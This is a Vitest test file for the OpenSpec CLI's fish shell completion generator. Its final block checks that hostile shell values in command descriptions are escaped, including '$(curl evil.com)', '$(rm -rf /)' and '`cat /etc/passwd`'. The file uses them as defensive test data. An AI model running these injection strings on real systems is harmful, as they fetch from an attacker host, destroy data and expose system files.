import { describe, it, expect, beforeEach } from 'vitest';
import { FishGenerator } from '../../../../src/core/completions/generators/fish-generator.js';
import { CommandDefinition } from '../../../../src/core/completions/types.js';

describe('FishGenerator', () => {
  let generator: FishGenerator;

  beforeEach(() => {
    generator = new FishGenerator();
  });

  describe('interface compliance', () => {
    it('should have shell property set to "fish"', () => {
      expect(generator.shell).toBe('fish');
    });

    it('should implement generate method', () => {
      expect(typeof generator.generate).toBe('function');
    });
  });

  describe('generate', () => {
    it('should generate valid fish completion script with header', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('# Fish completion script for OpenSpec CLI');
      expect(script).toContain('function __fish_openspec');
    });

    it('should generate helper functions for Fish', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('function __fish_openspec_using_subcommand');
      expect(script).toContain('function __fish_openspec_no_subcommand');
      expect(script).toContain('commandline -opc');
    });

    it('should include all commands with descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'init',
          description: 'Initialize OpenSpec',
          flags: [],
        },
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [],
        },
        {
          name: 'show',
          description: 'Show a spec',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("complete -c openspec");
      expect(script).toContain("-a 'init'");
      expect(script).toContain("'Initialize OpenSpec'");
      expect(script).toContain("-a 'validate'");
      expect(script).toContain("'Validate specs'");
      expect(script).toContain("-a 'show'");
      expect(script).toContain("'Show a spec'");
    });

    it('should handle commands with flags without short options', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'strict',
              description: 'Enable strict mode',
            },
            {
              name: 'json',
              description: 'Output as JSON',
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-l strict");
      expect(script).toContain("'Enable strict mode'");
      expect(script).toContain("-l json");
      expect(script).toContain("'Output as JSON'");
    });

    it('should handle flags with short options', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show a spec',
          flags: [
            {
              name: 'requirement',
              short: 'r',
              description: 'Show specific requirement',
              takesValue: true,
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-s r");
      expect(script).toContain("-l requirement");
      expect(script).toContain("'Show specific requirement'");
      expect(script).toContain("-r");
    });

    it('should use -r flag for flags that require values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'output',
              description: 'Output file',
              takesValue: true,
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-l output");
      expect(script).toContain("-r");
    });

    it('should not use -r flag for boolean flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'strict',
              description: 'Enable strict mode',
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      const lines = script.split('\n');
      const strictLine = lines.find(line => line.includes('-l strict'));

      expect(strictLine).toBeDefined();
      expect(strictLine).not.toContain(' -r');
    });

    it('should handle flags with enum values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'validate',
          description: 'Validate specs',
          flags: [
            {
              name: 'type',
              description: 'Specify item type',
              takesValue: true,
              values: ['change', 'spec'],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("-l type");
      expect(script).toContain("change");
      expect(script).toContain("spec");
    });

    it('should handle commands with subcommands', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'change',
          description: 'Manage changes',
          flags: [],
          subcommands: [
            {
              name: 'show',
              description: 'Show a change',
              flags: [],
            },
            {
              name: 'list',
              description: 'List changes',
              flags: [],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'change'");
      expect(script).toContain("'show'");
      expect(script).toContain("'list'");
      expect(script).toContain("__fish_openspec_using_subcommand change");
    });

    it('should handle positional arguments for change-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'archive',
          description: 'Archive a change',
          acceptsPositional: true,
          positionalType: 'change-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('__fish_openspec_changes');
    });

    it('should handle positional arguments for spec-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show-spec',
          description: 'Show a spec',
          acceptsPositional: true,
          positionalType: 'spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('__fish_openspec_specs');
    });

    it('should handle positional arguments for change-or-spec-id', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show an item',
          acceptsPositional: true,
          positionalType: 'change-or-spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('__fish_openspec_items');
    });

    it('should handle positional arguments for shell with inline values', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'generate',
          description: 'Generate completions',
          acceptsPositional: true,
          positionalType: 'shell',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('zsh');
      expect(script).toContain('bash');
      expect(script).toContain('fish');
      expect(script).toContain('powershell');
    });

    it('should generate dynamic completion helper for changes', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'archive',
          description: 'Archive a change',
          acceptsPositional: true,
          positionalType: 'change-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('function __fish_openspec_changes');
      expect(script).toContain('openspec __complete changes 2>/dev/null');
      expect(script).toContain('while read -l id desc');
      expect(script).toContain('printf');
    });

    it('should generate dynamic completion helper for specs', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show-spec',
          description: 'Show a spec',
          acceptsPositional: true,
          positionalType: 'spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('function __fish_openspec_specs');
      expect(script).toContain('openspec __complete specs 2>/dev/null');
    });

    it('should generate dynamic completion helper for items', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'show',
          description: 'Show an item',
          acceptsPositional: true,
          positionalType: 'change-or-spec-id',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain('function __fish_openspec_items');
      expect(script).toContain('__fish_openspec_changes');
      expect(script).toContain('__fish_openspec_specs');
    });

    it('should escape single quotes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Test with 'quotes'",
          flags: [
            {
              name: 'flag',
              description: "Special chars: 'quotes'",
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("\\'quotes\\'");
    });

    it('should handle complex nested subcommands with flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'spec',
          description: 'Manage specs',
          flags: [],
          subcommands: [
            {
              name: 'validate',
              description: 'Validate a spec',
              acceptsPositional: true,
              positionalType: 'spec-id',
              flags: [
                {
                  name: 'strict',
                  description: 'Enable strict mode',
                },
                {
                  name: 'json',
                  description: 'Output as JSON',
                },
              ],
            },
          ],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'spec'");
      expect(script).toContain("'validate'");
      expect(script).toContain("-l strict");
      expect(script).toContain("-l json");
      expect(script).toContain('__fish_openspec_specs');
    });

    it('should handle empty command list', () => {
      const commands: CommandDefinition[] = [];

      const script = generator.generate(commands);

      expect(script).toContain('# Fish completion script');
      expect(script).toContain('function __fish_openspec');
    });

    it('should handle commands with no flags', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'view',
          description: 'Display dashboard',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      expect(script).toContain("'view'");
      expect(script).toContain("'Display dashboard'");
    });
  });

  describe('security - command injection prevention', () => {
    it('should escape $() command substitution in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test command $(curl evil.com)',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should contain escaped dollar signs to prevent command substitution
      expect(script).toContain('\\$');
      // Should have backslash before $( to escape it
      expect(script).toMatch(/\\\$\(curl/);
    });

    it('should escape backticks in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test command `whoami`',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should not contain unescaped backticks
      expect(script).not.toMatch(/`whoami`/);
      // Should contain escaped version
      expect(script).toContain('\\`');
    });

    it('should escape dollar signs in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test with $variable',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should escape dollar signs
      expect(script).toContain('\\$');
    });

    it('should escape single quotes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Test with 'quotes'",
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should escape single quotes
      expect(script).toContain("\\'");
    });

    it('should escape backslashes in descriptions', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: 'Test with \\ backslash',
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should contain escaped backslashes
      expect(script).toContain('\\\\');
    });

    it('should handle multiple shell metacharacters together', () => {
      const commands: CommandDefinition[] = [
        {
          name: 'test',
          description: "Dangerous: $(rm -rf /) `cat /etc/passwd` $HOME 'quoted'",
          flags: [],
        },
      ];

      const script = generator.generate(commands);

      // Should contain escaped versions of dangerous patterns
      expect(script).toContain('\\$');  // Escaped dollar signs
      expect(script).toContain('\\`');  // Escaped backticks
      expect(script).toContain("\\'");  // Escaped single quotes

      // The escaped patterns should be present (backslash before dangerous chars)
      expect(script).toMatch(/\\\$\(/);  // \$( instead of $(
      expect(script).toMatch(/\\\`cat/);  // \`cat instead of `cat
    });
  });
});
